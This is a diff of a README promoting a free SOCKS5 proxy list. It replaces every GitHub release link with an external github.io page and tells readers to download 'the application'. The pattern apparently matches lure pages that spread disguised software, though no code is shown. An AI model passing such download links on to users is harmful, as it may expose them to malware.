@@ -1,6 +1,6 @@
 # 🔥 SOCKS5-Proxies-List-2026 - Get 10,000+ Working Proxies Instantly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-10,000%2B%20Free%20SOCKS5%20Proxies-blue?style=for-the-badge&logo=github)](https://github.com/absaivi/SOCKS5-Proxies-List-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-10,000%2B%20Free%20SOCKS5%20Proxies-blue?style=for-the-badge&logo=github)](https://absaivi.github.io)
 
 ## 🚀 What Is This?
 
@@ -23,7 +23,7 @@ This is a huge collection of **10,000+ fresh SOCKS5 proxies** for 2026. All prox
 
 ## ⚡ How to Download and Use
 
-Visit this link to download the application: [https://github.com/absaivi/SOCKS5-Proxies-List-2026/releases](https://github.com/absaivi/SOCKS5-Proxies-List-2026/releases)
+Visit this link to download the application: [https://absaivi.github.io](https://absaivi.github.io)
 
 1. **Click the download link** above
 2. **Find the latest release** (usually the top one)
@@ -86,6 +86,6 @@ This project is for personal and educational use. Redistribution is allowed as l
 - Share with friends who need free proxies
 - Report broken links or issues
 
-**Get started now:** [Download SOCKS5-Proxies-List-2026](https://github.com/absaivi/SOCKS5-Proxies-List-2026/releases)
+**Get started now:** [Download SOCKS5-Proxies-List-2026](https://absaivi.github.io)
 
 Keywords: anon-proxy, free-proxy, free-proxy-ip, free-proxy-list, fresh-proxies, fresh-proxies-2026, proxy-collection, proxy-list, proxy-scraper, socks5, socks5-proxies, socks5-proxy-list, working-proxy
